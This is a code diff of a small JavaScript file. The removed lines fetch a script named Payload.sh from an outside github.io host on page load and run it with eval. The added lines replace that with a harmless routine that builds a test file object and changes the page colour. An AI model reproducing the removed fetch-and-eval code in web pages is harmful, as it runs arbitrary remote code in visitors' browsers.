@@ -1,32 +1,18 @@
-(function () {
-    // Simulated WebSocket payload URL
-    const simulatedWebSocketPayloadURL = "https://raoufdz28.github.io/files/Payload.sh";
-
-    // Function to simulate receiving a WebSocket message and executing a payload
-    async function executeSimulatedPayload(payloadURL) {
+// Simulates receiving a command from a WebSocket
+function simulateWebSocketCommand(command) {
+    if (command === "createFile") {
         try {
-            // Fetch the payload from the provided URL
-            const response = await fetch(payloadURL);
-            if (!response.ok) {
-                console.error("Failed to fetch payload:", response.status);
-                document.body.style.backgroundColor = "red"; // Indicate failure
-                return;
-            }
+            const fileName = "/storage/emulated/0/Download/testfile.txt";
+            const fileHandle = new File([new Blob()], fileName, { type: "text/plain" });
 
-            const payload = await response.text();
-            console.log("Payload fetched:", payload);
-
-            // Dynamically construct a function to execute the payload
-            const exec = new Function(`return function() { try { eval(\`${payload}\`); } catch (e) { console.error('Execution failed', e); document.body.style.backgroundColor = 'red'; } }`)();
-            exec(); // Execute the fetched payload
-
-            document.body.style.backgroundColor = "green"; // Indicate success
+            console.log(`File created: ${fileHandle.name}`);
+            document.body.style.backgroundColor = "green";
         } catch (error) {
-            console.error("Payload execution failed:", error);
-            document.body.style.backgroundColor = "red"; // Indicate failure
+            console.error("Error creating file:", error);
+            document.body.style.backgroundColor = "red";
         }
     }
+}
 
-    // Simulate receiving the payload from the WebSocket
-    executeSimulatedPayload(simulatedWebSocketPayloadURL);
-})();
+// Simulate a WebSocket message
+simulateWebSocketCommand("createFile");
